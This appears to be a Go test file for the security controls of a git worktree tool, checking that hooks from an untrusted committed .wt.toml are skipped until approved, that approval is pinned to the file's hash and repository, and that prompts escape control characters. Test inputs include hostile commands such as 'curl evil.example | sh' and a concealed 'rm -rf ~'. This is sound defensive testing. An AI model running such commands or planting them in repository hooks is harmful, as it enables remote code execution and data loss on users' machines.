package cmd

import (
	"bytes"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"

	"github.com/BurntSushi/toml"
	"github.com/spf13/cobra"
)

// withUserOwnedHooks makes the batch under test look like it came from the
// user's own config file, isolating it from whatever a previous test left in the
// package-level hookSources.
func withUserOwnedHooks(t *testing.T) {
	t.Helper()
	saved := hookSources
	hookSources = map[string]string{}
	t.Cleanup(func() { hookSources = saved })
}

// repoWithHooks writes a .wt.toml containing the given body and points the
// package globals at it as if loadWorktreeConfig had found it. It returns the
// repo directory and the fake git-common-dir used as the trust key.
func repoWithHooks(t *testing.T, body string) (repoDir, trustKey string) {
	t.Helper()

	repoDir = t.TempDir()
	trustKey = filepath.Join(repoDir, ".git")

	savedPath, savedFound, savedSHA := configRepoPath, configRepoFound, configRepoSHA
	savedKey, savedKeyFn := configRepoKey, repoTrustKeyFn
	savedRepoHooks := repoConfigHooks
	t.Cleanup(func() { repoConfigHooks = savedRepoHooks })
	repoTrustKeyFn = func() (string, error) { return trustKey, nil }
	t.Cleanup(func() {
		configRepoPath, configRepoFound, configRepoSHA = savedPath, savedFound, savedSHA
		configRepoKey, repoTrustKeyFn = savedKey, savedKeyFn
	})

	writeRepoConfig(t, repoDir, body)
	return repoDir, trustKey
}

// writeRepoConfig writes .wt.toml and sets the globals loadWorktreeConfig would
// have set, including the hash of the bytes it decoded. Calling it again stands
// in for a later wt run picking up an edited file.
func writeRepoConfig(t *testing.T, repoDir, body string) {
	t.Helper()

	wtToml := filepath.Join(repoDir, ".wt.toml")
	if err := os.WriteFile(wtToml, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	configRepoPath = wtToml
	configRepoFound = true
	configRepoSHA = hashBytes([]byte(body))
	// Mirror loadWorktreeConfig, which records the repo's hooks alongside the
	// hash so the approval prompt can show the whole file.
	var cfg Config
	if _, err := toml.Decode(body, &cfg); err != nil {
		t.Fatal(err)
	}
	repoConfigHooks = cfg.Hooks
	if key, err := repoTrustKeyFn(); err == nil {
		configRepoKey = key
	}
}

// withRepoSuppliedHook marks a hook event as having come from the repo config.
func withRepoSuppliedHook(t *testing.T, event string) {
	t.Helper()
	saved := hookSources
	hookSources = map[string]string{event: hookSourceRepoConfig}
	t.Cleanup(func() { hookSources = saved })
}

// withIsolatedTrustStore points the trust store at a scratch directory.
func withIsolatedTrustStore(t *testing.T) {
	t.Helper()
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
}

// withPolicy sets the hook approval policy for one test.
func withPolicy(t *testing.T, policy string) {
	t.Helper()
	saved := hooksPolicy
	hooksPolicy = policy
	t.Cleanup(func() { hooksPolicy = saved })
	t.Setenv("WT_HOOKS_POLICY", "")
	t.Setenv("WT_HOOKS_DISABLED", "")
	t.Setenv("WT_HOOKS_APPROVE_ALL", "")
}

// TestUntrustedRepoHooksDoNotRun is the regression test for #129: a committed
// .wt.toml must not be able to run commands just because someone cloned the repo
// and ran wt in it.
func TestUntrustedRepoHooksDoNotRun(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"touch pwned\"]\n")
	withRepoSuppliedHook(t, "post_create")

	marker := filepath.Join(repoDir, "pwned")
	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatalf("runHooks() returned error: %v", err)
	}

	if _, err := os.Stat(marker); err == nil {
		t.Fatal("untrusted repo hook ran; it must be skipped until approved")
	}
}

// TestUntrustedRepoPreHookDoesNotAbort: declining a hook is not an error the
// user should have to work around. The operation continues without it.
func TestUntrustedRepoPreHookDoesNotAbort(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	repoWithHooks(t, "[hooks]\npre_create = [\"false\"]\n")
	withRepoSuppliedHook(t, "pre_create")

	if err := runHooks("pre_create", []string{"false"}, map[string]string{}); err != nil {
		t.Fatalf("skipping an unapproved pre-hook must not abort the operation, got: %v", err)
	}
}

func TestTrustedRepoHooksRun(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"touch ok\"]\n")
	withRepoSuppliedHook(t, "post_create")

	trust, err := currentRepoHookTrust()
	if err != nil {
		t.Fatal(err)
	}
	if err := trustCurrentRepo(trust); err != nil {
		t.Fatal(err)
	}

	marker := filepath.Join(repoDir, "ok")
	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatalf("runHooks() returned error: %v", err)
	}
	if _, err := os.Stat(marker); err != nil {
		t.Fatal("trusted repo hook did not run")
	}
}

// TestTrustIsInvalidatedByEdit: approval is pinned to the file's contents, so a
// later commit adding a hook has to be approved again.
func TestTrustIsInvalidatedByEdit(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")
	withRepoSuppliedHook(t, "post_create")

	trust, err := currentRepoHookTrust()
	if err != nil {
		t.Fatal(err)
	}
	if err := trustCurrentRepo(trust); err != nil {
		t.Fatal(err)
	}

	// Someone pulls, and .wt.toml now asks for something else.
	marker := filepath.Join(repoDir, "pwned")
	writeRepoConfig(t, repoDir, "[hooks]\npost_create = ['touch "+marker+"']\n")

	if trust, err := currentRepoHookTrust(); err != nil {
		t.Fatal(err)
	} else if trust.trusted {
		t.Fatal("trust survived an edit to .wt.toml")
	}

	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("hook ran after .wt.toml changed; approval must not carry over")
	}
}

// TestTrustDoesNotTransferBetweenRepos: an identical .wt.toml elsewhere is not
// covered. "make setup" is only as safe as the Makefile next to it.
func TestTrustDoesNotTransferBetweenRepos(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)

	body := "[hooks]\npost_create = [\"make setup\"]\n"
	repoWithHooks(t, body)
	trust, err := currentRepoHookTrust()
	if err != nil {
		t.Fatal(err)
	}
	if err := trustCurrentRepo(trust); err != nil {
		t.Fatal(err)
	}
	approvedSHA := trust.sha

	// A second repository shipping byte-identical config.
	repoWithHooks(t, body)
	other, err := currentRepoHookTrust()
	if err != nil {
		t.Fatal(err)
	}
	if other.sha != approvedSHA {
		t.Fatalf("test setup: expected identical hashes, got %s and %s", approvedSHA, other.sha)
	}
	if other.trusted {
		t.Fatal("approval leaked to a different repository with identical .wt.toml")
	}
}

// TestTrustKeyRejectsClaimedCommonDir: a directory can put anything in a `.git`
// file, including the git dir of a repository you trust. The trust key must not
// take that claim at face value, or an identical .wt.toml would inherit the
// approval and run its commands in the claimant's working tree.
func TestTrustKeyRejectsClaimedCommonDir(t *testing.T) {
	realRepo := t.TempDir()
	gitInit(t, realRepo)

	// A directory that is not a worktree of realRepo, but says it is.
	impostor := t.TempDir()
	gitDirFile := "gitdir: " + filepath.Join(realRepo, ".git") + "\n"
	if err := os.WriteFile(filepath.Join(impostor, ".git"), []byte(gitDirFile), 0o644); err != nil {
		t.Fatal(err)
	}

	t.Chdir(realRepo)
	realKey, err := defaultRepoTrustKey()
	if err != nil {
		t.Fatal(err)
	}
	if realKey != canonicalPath(filepath.Join(realRepo, ".git")) {
		t.Errorf("trust key for a real checkout = %q, want its common git dir", realKey)
	}

	t.Chdir(impostor)
	impostorKey, err := defaultRepoTrustKey()
	if err != nil {
		t.Fatal(err)
	}
	if impostorKey == realKey {
		t.Fatal("a .git file claiming another repository's git dir inherited its trust key")
	}
	if impostorKey != canonicalPath(impostor) {
		t.Errorf("impostor trust key = %q, want its own path %q", impostorKey, canonicalPath(impostor))
	}
}

// TestTrustKeyIsSharedByWorktrees: the flip side — a genuine linked worktree
// must keep the main checkout's key, or every wt create would re-prompt.
func TestTrustKeyIsSharedByWorktrees(t *testing.T) {
	repo := t.TempDir()
	gitInit(t, repo)

	t.Chdir(repo)
	mainKey, err := defaultRepoTrustKey()
	if err != nil {
		t.Fatal(err)
	}

	linked := filepath.Join(t.TempDir(), "wt")
	runGit(t, repo, "worktree", "add", "-b", "feat/x", linked)

	t.Chdir(linked)
	linkedKey, err := defaultRepoTrustKey()
	if err != nil {
		t.Fatal(err)
	}
	if linkedKey != mainKey {
		t.Errorf("linked worktree key = %q, want the main checkout's %q", linkedKey, mainKey)
	}
}

func gitInit(t *testing.T, dir string) {
	t.Helper()
	runGit(t, dir, "init", "-q")
	runGit(t, dir, "config", "user.email", "test@example.com")
	runGit(t, dir, "config", "user.name", "test")
	if err := os.WriteFile(filepath.Join(dir, "README"), []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	runGit(t, dir, "add", "README")
	runGit(t, dir, "commit", "-qm", "initial")
}

func runGit(t *testing.T, dir string, args ...string) {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
}

func TestUntrustRevokes(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")

	trust, err := currentRepoHookTrust()
	if err != nil {
		t.Fatal(err)
	}
	if err := trustCurrentRepo(trust); err != nil {
		t.Fatal(err)
	}

	if err := runUntrust(nil); err != nil {
		t.Fatal(err)
	}

	after, err := currentRepoHookTrust()
	if err != nil {
		t.Fatal(err)
	}
	if after.trusted {
		t.Fatal("wt untrust did not revoke the approval")
	}
}

// TestUserHooksRunWithoutApproval: the fix must not make the tool annoying for
// hooks the user wrote themselves.
func TestUserHooksRunWithoutApproval(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	withUserOwnedHooks(t)

	dir := t.TempDir()
	marker := filepath.Join(dir, "ran")
	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err != nil {
		t.Fatal("hook from the user's own config did not run")
	}
}

// TestPromptAllGatesUserHooksToo answers the "require approval for everything"
// case: under prompt-all even user-owned hooks need a human, so with no terminal
// they are skipped.
func TestPromptAllGatesUserHooksToo(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptAll)
	withUserOwnedHooks(t)

	dir := t.TempDir()
	marker := filepath.Join(dir, "ran")
	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("prompt-all ran a hook without approval")
	}
}

// TestApproveAllEscapeHatch: the documented opt-out for automation the user
// controls.
func TestApproveAllEscapeHatch(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")
	withRepoSuppliedHook(t, "post_create")
	t.Setenv("WT_HOOKS_APPROVE_ALL", "1")

	marker := filepath.Join(repoDir, "ran")
	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err != nil {
		t.Fatal("WT_HOOKS_APPROVE_ALL=1 did not approve the hook")
	}
}

func TestEffectiveHooksPolicy(t *testing.T) {
	tests := []struct {
		name       string
		configured string
		envPolicy  string
		envDisable string
		want       string
	}{
		{name: "defaults to prompt-untrusted", want: hookPolicyPromptUntrusted},
		{name: "config file value", configured: hookPolicyPromptAll, want: hookPolicyPromptAll},
		{name: "env overrides config", configured: hookPolicyPromptAll, envPolicy: hookPolicyTrustedOnly, want: hookPolicyTrustedOnly},
		{name: "WT_HOOKS_DISABLED wins", configured: hookPolicyPromptAll, envDisable: "1", want: hookPolicyOff},
		{name: "unknown value falls back to the safe default", configured: "yolo", want: hookPolicyPromptUntrusted},
		{name: "typo in env does not weaken a stricter config", configured: hookPolicyPromptAll, envPolicy: "promt-all", want: hookPolicyPromptAll},
		{name: "typo in env with no config falls back to the default", envPolicy: "promt-all", want: hookPolicyPromptUntrusted},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			withPolicy(t, tt.configured)
			t.Setenv("WT_HOOKS_POLICY", tt.envPolicy)
			t.Setenv("WT_HOOKS_DISABLED", tt.envDisable)

			if got := effectiveHooksPolicy(); got != tt.want {
				t.Errorf("effectiveHooksPolicy() = %q, want %q", got, tt.want)
			}
		})
	}
}

// TestLoadWorktreeConfigTracksHookSources covers the load-time half: hooks have
// to arrive at runHooks knowing which layer supplied them, and a repository must
// not be able to set the policy that governs its own hooks.
func TestLoadWorktreeConfigTracksHookSources(t *testing.T) {
	savedFlag, savedFn := configFlag, gitRepoRootFn
	savedHooks, savedRepoHooks := worktreeHooks, repoConfigHooks
	savedSources, savedPolicy := hookSources, hooksPolicy
	t.Cleanup(func() {
		configFlag, gitRepoRootFn = savedFlag, savedFn
		worktreeHooks, repoConfigHooks = savedHooks, savedRepoHooks
		hookSources, hooksPolicy = savedSources, savedPolicy
		loadWorktreeConfig()
	})

	tmpDir := t.TempDir()
	globalCfg := filepath.Join(tmpDir, "global.toml")
	if err := os.WriteFile(globalCfg, []byte(`hooks_policy = "prompt-all"

[hooks]
pre_create = ["mine"]
post_create = ["mine too"]
`), 0o644); err != nil {
		t.Fatal(err)
	}

	repoDir := filepath.Join(tmpDir, "repo")
	if err := os.MkdirAll(repoDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repoDir, ".wt.toml"), []byte(`hooks_policy = "off"

[hooks]
post_create = ["theirs"]
post_clone = ["theirs too"]
`), 0o644); err != nil {
		t.Fatal(err)
	}

	configFlag = ""
	t.Setenv("WT_CONFIG", globalCfg)
	gitRepoRootFn = func() (string, error) { return repoDir, nil }

	loadWorktreeConfig()

	if got := hookSources["pre_create"]; got != hookSourceConfigFile {
		t.Errorf("hookSources[pre_create] = %q, want %q", got, hookSourceConfigFile)
	}
	if got := hookSources["post_create"]; got != hookSourceRepoConfig {
		t.Errorf("hookSources[post_create] = %q, want %q", got, hookSourceRepoConfig)
	}
	if got := hooksPolicy; got != hookPolicyPromptAll {
		t.Errorf("hooksPolicy = %q, want %q — .wt.toml must not set the policy", got, hookPolicyPromptAll)
	}

	// pre_clone/post_clone are not merged from repo config, so nothing there is
	// repo-sourced either.
	if got := hookSources["post_clone"]; got != "" {
		t.Errorf("hookSources[post_clone] = %q, want unset", got)
	}
	if len(worktreeHooks.PostClone) != 0 {
		t.Errorf("worktreeHooks.PostClone = %v, want empty", worktreeHooks.PostClone)
	}

	entries := repoHookCommands()
	if len(entries) != 1 || entries[0].Event != "post_create" || entries[0].Cmd != "theirs" {
		t.Errorf("repoHookCommands() = %+v, want the single post_create command", entries)
	}
}

func TestTrustStoreRoundTrip(t *testing.T) {
	withIsolatedTrustStore(t)

	store, err := loadTrustStore()
	if err != nil {
		t.Fatal(err)
	}
	if len(store.Trusted) != 0 {
		t.Fatalf("fresh trust store has %d records, want 0", len(store.Trusted))
	}

	store.add(trustRecord{Repo: "/repo/.git", File: "/repo/.wt.toml", SHA256: "aaa", ApprovedAt: "now"})
	store.add(trustRecord{Repo: "/repo/.git", File: "/repo/.wt.toml", SHA256: "bbb", ApprovedAt: "now"})
	store.add(trustRecord{Repo: "/repo/.git", File: "/repo/.wt.toml", SHA256: "aaa", ApprovedAt: "later"})
	if len(store.Trusted) != 2 {
		t.Fatalf("add() kept %d records, want 2 (same repo+hash should replace)", len(store.Trusted))
	}

	if err := saveTrustStore(store); err != nil {
		t.Fatal(err)
	}

	// 0600: the record of what the user agreed to execute. Windows has no
	// Unix permission bits — os.Chmod there only toggles the read-only flag —
	// so the assertion is meaningless on that platform.
	if runtime.GOOS != "windows" {
		info, err := os.Stat(trustFilePath())
		if err != nil {
			t.Fatal(err)
		}
		if perm := info.Mode().Perm(); perm != 0o600 {
			t.Errorf("trust store mode = %o, want 600", perm)
		}
	}

	reloaded, err := loadTrustStore()
	if err != nil {
		t.Fatal(err)
	}
	if !reloaded.isTrusted("/repo/.git", "aaa") || !reloaded.isTrusted("/repo/.git", "bbb") {
		t.Error("records did not survive a save/load round trip")
	}
	if reloaded.isTrusted("/elsewhere/.git", "aaa") {
		t.Error("isTrusted() matched on hash alone; repo must match too")
	}
	if reloaded.isTrusted("/repo/.git", "ccc") {
		t.Error("isTrusted() matched on repo alone; hash must match too")
	}

	if removed := reloaded.remove("/repo/.git"); removed != 2 {
		t.Errorf("remove() = %d, want 2", removed)
	}
}

// TestMalformedTrustStoreIsAnError: silently reading a broken store as "nothing
// is trusted" is safe, but leaves the user re-approving forever with no clue.
func TestMalformedTrustStoreIsAnError(t *testing.T) {
	withIsolatedTrustStore(t)
	path := trustFilePath()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("this is not toml ]["), 0o600); err != nil {
		t.Fatal(err)
	}

	if _, err := loadTrustStore(); err == nil {
		t.Fatal("loadTrustStore() accepted a malformed store")
	}
}

// TestApprovalRequestShowsWholeFile: approving from the prompt persists trust
// for the entire .wt.toml, so the prompt has to show every command that file
// contributes — otherwise a harmless post_create buys silent consent for a
// pre_remove the user never saw.
func TestApprovalRequestShowsWholeFile(t *testing.T) {
	savedHooks, savedSources := repoConfigHooks, hookSources
	repoConfigHooks = Hooks{
		PostCreate: []string{"echo hello"},
		PreRemove:  []string{"curl evil.example | sh"},
	}
	hookSources = map[string]string{
		"post_create": hookSourceRepoConfig,
		"pre_remove":  hookSourceRepoConfig,
	}
	t.Cleanup(func() { repoConfigHooks, hookSources = savedHooks, savedSources })

	var buf bytes.Buffer
	printHookApprovalRequest(&buf, repoHookCommands(), "post_create", repoHookTrust{file: ".wt.toml"})
	out := buf.String()

	for _, want := range []string{"→ [post_create] echo hello", "[pre_remove] curl evil.example | sh"} {
		if !strings.Contains(out, want) {
			t.Errorf("approval request missing %q, got:\n%s", want, out)
		}
	}
	if strings.Contains(out, "→ [pre_remove]") {
		t.Errorf("only the firing event should be marked, got:\n%s", out)
	}
}

// TestApproveAllSurvivesABrokenTrustStore: an unattended run that opted into
// WT_HOOKS_APPROVE_ALL should not start skipping hooks because the store it was
// told to bypass has been corrupted.
func TestApproveAllSurvivesABrokenTrustStore(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")
	withRepoSuppliedHook(t, "post_create")

	path := trustFilePath()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("not toml ]["), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("WT_HOOKS_APPROVE_ALL", "1")

	marker := filepath.Join(repoDir, "ran")
	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err != nil {
		t.Fatal("WT_HOOKS_APPROVE_ALL=1 did not survive an unreadable trust store")
	}
}

// TestDisplayTextEscapesControlCharacters: the prompt is where the user
// decides whether to run these commands, so the commands must not be able to
// redraw it.
func TestDisplayTextEscapesControlCharacters(t *testing.T) {
	tests := []struct {
		in   string
		want string
	}{
		{in: "npm install && echo 'ok'", want: "npm install && echo 'ok'"},
		{in: "echo hi\x1b[2Jcurl evil.example | sh", want: `echo hi\x1b[2Jcurl evil.example | sh`},
		{in: "safe\rrm -rf ~", want: `safe\rrm -rf ~`},
		{in: "echo \u202egnahtemos", want: `echo \u202egnahtemos`},
		{in: "a\tb", want: `a\tb`},
		{in: "échò ✓", want: "échò ✓"},
	}

	for _, tt := range tests {
		if got := displayText(tt.in); got != tt.want {
			t.Errorf("displayText(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

// TestOffersTrust: the "remember this" option is only honest where taking it
// actually stops the next prompt.
func TestOffersTrust(t *testing.T) {
	tests := []struct {
		fromRepo bool
		policy   string
		want     bool
	}{
		{fromRepo: true, policy: hookPolicyPromptUntrusted, want: true},
		{fromRepo: true, policy: hookPolicyPromptAll, want: false},
		{fromRepo: false, policy: hookPolicyPromptAll, want: false},
		{fromRepo: false, policy: hookPolicyPromptUntrusted, want: false},
	}
	for _, tt := range tests {
		if got := offersTrust(tt.fromRepo, tt.policy); got != tt.want {
			t.Errorf("offersTrust(%v, %q) = %v, want %v", tt.fromRepo, tt.policy, got, tt.want)
		}
	}
}

// TestApprovalRequestOmitsRestNoteWhenThereIsNoRest: the note only makes sense
// when the approval reaches beyond what is about to run.
func TestApprovalRequestOmitsRestNoteWhenThereIsNoRest(t *testing.T) {
	const note = "covers the rest"

	var repoOneEvent bytes.Buffer
	printHookApprovalRequest(&repoOneEvent, []hookEntry{
		{Event: "post_create", Cmd: "a"},
		{Event: "post_create", Cmd: "b"},
	}, "post_create", repoHookTrust{file: ".wt.toml"})
	if strings.Contains(repoOneEvent.String(), note) {
		t.Errorf("note shown for a single-event file, got:\n%s", repoOneEvent.String())
	}

	var userHooks bytes.Buffer
	printHookApprovalRequest(&userHooks, []hookEntry{
		{Event: "post_create", Cmd: "a"},
		{Event: "pre_remove", Cmd: "b"},
	}, "post_create", repoHookTrust{})
	if strings.Contains(userHooks.String(), note) {
		t.Errorf("note shown for user-owned hooks, where trusting is not on offer, got:\n%s", userHooks.String())
	}
}

// TestTrustCommandsRejectArguments: 'wt trust typo' must not quietly approve the
// repository the user is standing in.
func TestTrustCommandsRejectArguments(t *testing.T) {
	for _, c := range []*cobra.Command{trustCmd, untrustCmd} {
		if err := c.Args(c, []string{"unexpected"}); err == nil {
			t.Errorf("wt %s accepted an unexpected argument", c.Name())
		}
	}
}

// TestTrustSurvivesADeletedWorkingDirectory: wt remove fires post_remove hooks
// after git has deleted the worktree, so the trust key cannot be resolved by
// asking git from the current directory at that point.
func TestTrustSurvivesADeletedWorkingDirectory(t *testing.T) {
	if runtime.GOOS == "windows" {
		// Windows will not delete a directory that is any process's current
		// directory, so the situation this test recreates cannot be staged
		// there. The code path it covers is shared across platforms.
		t.Skip("cannot remove the current working directory on Windows")
	}
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)

	repoDir := t.TempDir()
	gitInit(t, repoDir)
	t.Chdir(repoDir)

	savedPath, savedFound, savedSHA, savedKey := configRepoPath, configRepoFound, configRepoSHA, configRepoKey
	t.Cleanup(func() {
		configRepoPath, configRepoFound, configRepoSHA, configRepoKey = savedPath, savedFound, savedSHA, savedKey
	})
	writeRepoConfig(t, repoDir, "[hooks]\npost_remove = [\"true\"]\n")
	withRepoSuppliedHook(t, "post_remove")

	trust, err := currentRepoHookTrust()
	if err != nil {
		t.Fatal(err)
	}
	if err := trustCurrentRepo(trust); err != nil {
		t.Fatal(err)
	}

	// The directory wt was standing in goes away, as it does under wt remove.
	gone := filepath.Join(repoDir, "sub")
	if err := os.Mkdir(gone, 0o755); err != nil {
		t.Fatal(err)
	}
	t.Chdir(gone)
	if err := os.RemoveAll(gone); err != nil {
		t.Fatal(err)
	}

	after, err := currentRepoHookTrust()
	if err != nil {
		t.Fatalf("trust lookup failed once the working directory was gone: %v", err)
	}
	if !after.trusted {
		t.Fatal("approval was lost once the working directory was gone")
	}
}

// TestPromptAllStillAsksWhenTheTrustStoreIsUnreadable: prompt-all never
// consults trust to decide, so a store it cannot read must not turn into a
// silent skip. Non-interactive here, so the answer is still no — but the
// request has to be the one that reaches the user, not a trust-store error.
func TestPromptAllStillAsksWhenTheTrustStoreIsUnreadable(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptAll)
	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")
	withRepoSuppliedHook(t, "post_create")

	path := trustFilePath()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("not toml ]["), 0o600); err != nil {
		t.Fatal(err)
	}

	stderr := captureStderr(t)
	marker := filepath.Join(repoDir, "ran")
	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatal(err)
	}
	out := stderr()

	if !strings.Contains(out, "true") {
		t.Errorf("the commands were never put to the user, got:\n%s", out)
	}
	if strings.Contains(out, "skipping post_create hooks from .wt.toml") {
		t.Errorf("an unreadable store short-circuited a prompt-all decision, got:\n%s", out)
	}
}

// captureStderr redirects os.Stderr for the duration of a test and returns a
// function yielding what was written.
func captureStderr(t *testing.T) func() string {
	t.Helper()
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	saved := os.Stderr
	os.Stderr = w

	done := make(chan string, 1)
	go func() {
		var buf bytes.Buffer
		_, _ = io.Copy(&buf, r)
		done <- buf.String()
	}()

	var out string
	var once sync.Once
	read := func() string {
		once.Do(func() {
			os.Stderr = saved
			_ = w.Close()
			out = <-done
			_ = r.Close()
		})
		return out
	}
	t.Cleanup(func() { read() })
	return read
}
